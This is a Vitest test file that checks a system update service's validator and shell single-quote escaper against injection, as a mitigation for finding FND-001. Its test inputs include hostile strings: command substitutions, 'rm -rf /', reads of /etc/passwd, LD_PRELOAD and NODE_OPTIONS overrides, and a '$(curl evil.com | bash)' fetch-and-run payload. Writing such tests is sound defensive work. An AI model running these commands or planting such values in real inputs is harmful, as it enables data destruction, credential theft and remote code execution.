/**
 * FND-001 Security Tests: systemUpdateService parameter validation
 *
 * These tests verify that the MITM mitigation in systemUpdateService
 * correctly rejects shell injection attempts and enforces strict
 * parameter formats for values that get written to a `source`d env file.
 */
import { describe, it, expect, vi } from 'vitest';

// Mock storage (requires DATABASE_URL) before importing the module under test
vi.mock('../storage', () => ({ storage: {} }));

import { validateUpdateParam, shellSingleQuoteEscape } from '../services/systemUpdateService';

// ---------------------------------------------------------------------------
// validateUpdateParam
// ---------------------------------------------------------------------------
describe('validateUpdateParam', () => {
  // --- branch parameter ---
  describe('branch', () => {
    it('accepts valid branch names', () => {
      expect(validateUpdateParam('branch', 'main')).toBe('main');
      expect(validateUpdateParam('branch', 'feature/add-tests')).toBe('feature/add-tests');
      expect(validateUpdateParam('branch', 'release-1.2.3')).toBe('release-1.2.3');
      expect(validateUpdateParam('branch', 'v2.0')).toBe('v2.0');
      expect(validateUpdateParam('branch', 'hotfix_urgent')).toBe('hotfix_urgent');
    });

    it('rejects branch names with shell metacharacters', () => {
      expect(validateUpdateParam('branch', '$(whoami)')).toBeNull();
      expect(validateUpdateParam('branch', '`id`')).toBeNull();
      expect(validateUpdateParam('branch', 'main;rm -rf /')).toBeNull();
      expect(validateUpdateParam('branch', 'test|cat /etc/passwd')).toBeNull();
      expect(validateUpdateParam('branch', 'a&b')).toBeNull();
      expect(validateUpdateParam('branch', "main'$(evil)")).toBeNull();
      expect(validateUpdateParam('branch', 'main"$(evil)')).toBeNull();
    });

    it('rejects branch names with newlines (header injection)', () => {
      expect(validateUpdateParam('branch', 'main\nDANGEROUS=yes')).toBeNull();
      expect(validateUpdateParam('branch', 'main\rDANGEROUS=yes')).toBeNull();
    });

    it('rejects null bytes', () => {
      expect(validateUpdateParam('branch', 'main\x00evil')).toBeNull();
    });

    it('rejects empty or single-char branch names', () => {
      // Regex requires at least 2 chars (start + end anchors)
      expect(validateUpdateParam('branch', '')).toBeNull();
      expect(validateUpdateParam('branch', 'a')).toBeNull();
    });

    it('rejects branch starting/ending with special chars', () => {
      expect(validateUpdateParam('branch', '.hidden')).toBeNull();
      expect(validateUpdateParam('branch', '-flag')).toBeNull();
      expect(validateUpdateParam('branch', 'trail.')).toBeNull();
      expect(validateUpdateParam('branch', 'trail-')).toBeNull();
    });
  });

  // --- token parameter ---
  describe('token', () => {
    it('accepts valid GitHub PAT-style tokens', () => {
      expect(validateUpdateParam('token', 'ghp_1234567890abcdef')).toBe('ghp_1234567890abcdef');
      expect(validateUpdateParam('token', 'github_pat_xxxxx')).toBe('github_pat_xxxxx');
    });

    it('rejects tokens with shell injection', () => {
      expect(validateUpdateParam('token', '$(curl evil.com)')).toBeNull();
      expect(validateUpdateParam('token', 'token`id`')).toBeNull();
      expect(validateUpdateParam('token', 'tok;rm -rf /')).toBeNull();
    });

    it('rejects tokens exceeding 512 chars', () => {
      const longToken = 'a'.repeat(513);
      expect(validateUpdateParam('token', longToken)).toBeNull();
    });

    it('accepts max-length token (512 chars)', () => {
      const maxToken = 'a'.repeat(512);
      expect(validateUpdateParam('token', maxToken)).toBe(maxToken);
    });
  });

  // --- skipBackup parameter ---
  describe('skipBackup', () => {
    it('accepts boolean-like values', () => {
      expect(validateUpdateParam('skipBackup', 'true')).toBe('true');
      expect(validateUpdateParam('skipBackup', 'false')).toBe('false');
      expect(validateUpdateParam('skipBackup', 'TRUE')).toBe('TRUE');
      expect(validateUpdateParam('skipBackup', '1')).toBe('1');
      expect(validateUpdateParam('skipBackup', '0')).toBe('0');
    });

    it('rejects non-boolean values', () => {
      expect(validateUpdateParam('skipBackup', 'yes')).toBeNull();
      expect(validateUpdateParam('skipBackup', 'maybe')).toBeNull();
      expect(validateUpdateParam('skipBackup', '$(true)')).toBeNull();
    });
  });

  // --- unknown parameters (whitelist enforcement) ---
  describe('unknown parameters', () => {
    it('rejects any parameter not in whitelist', () => {
      expect(validateUpdateParam('malicious', 'anything')).toBeNull();
      expect(validateUpdateParam('PATH', '/evil')).toBeNull();
      expect(validateUpdateParam('LD_PRELOAD', '/tmp/evil.so')).toBeNull();
      expect(validateUpdateParam('NODE_OPTIONS', '--require=evil')).toBeNull();
    });
  });

  // --- null/undefined handling ---
  describe('null/undefined', () => {
    it('returns null for undefined values', () => {
      expect(validateUpdateParam('branch', undefined)).toBeNull();
    });

    it('returns null for null values', () => {
      expect(validateUpdateParam('branch', null)).toBeNull();
    });
  });

  // --- type coercion ---
  describe('type coercion', () => {
    it('coerces numbers to string before validation', () => {
      expect(validateUpdateParam('skipBackup', 1)).toBe('1');
      expect(validateUpdateParam('skipBackup', 0)).toBe('0');
    });
  });
});

// ---------------------------------------------------------------------------
// shellSingleQuoteEscape
// ---------------------------------------------------------------------------
describe('shellSingleQuoteEscape', () => {
  it('returns plain strings unchanged', () => {
    expect(shellSingleQuoteEscape('hello')).toBe('hello');
    expect(shellSingleQuoteEscape('main')).toBe('main');
    expect(shellSingleQuoteEscape('')).toBe('');
  });

  it('escapes single quotes using close-escape-reopen idiom', () => {
    expect(shellSingleQuoteEscape("it's")).toBe("it'\\''s");
    expect(shellSingleQuoteEscape("a'b'c")).toBe("a'\\''b'\\''c");
  });

  it('does not escape double quotes (they are literal in single-quoted strings)', () => {
    expect(shellSingleQuoteEscape('say "hello"')).toBe('say "hello"');
  });

  it('does not escape dollar signs (they are literal in single-quoted strings)', () => {
    expect(shellSingleQuoteEscape('$HOME')).toBe('$HOME');
  });

  it('does not escape backticks (they are literal in single-quoted strings)', () => {
    expect(shellSingleQuoteEscape('`id`')).toBe('`id`');
  });

  it('produces shell-safe output: escaped value inside single quotes is inert', () => {
    // When wrapped in single quotes, the escaped value must not produce
    // command substitution. The only character that breaks single-quoting
    // is a single-quote itself, and that's what we escape.
    const malicious = "$(curl evil.com | bash)";
    const escaped = shellSingleQuoteEscape(malicious);
    // No single quotes in the original, so output is unchanged
    expect(escaped).toBe(malicious);
    // When placed inside '...', bash treats it as a literal string
    // (no $() expansion inside single quotes)
  });
});
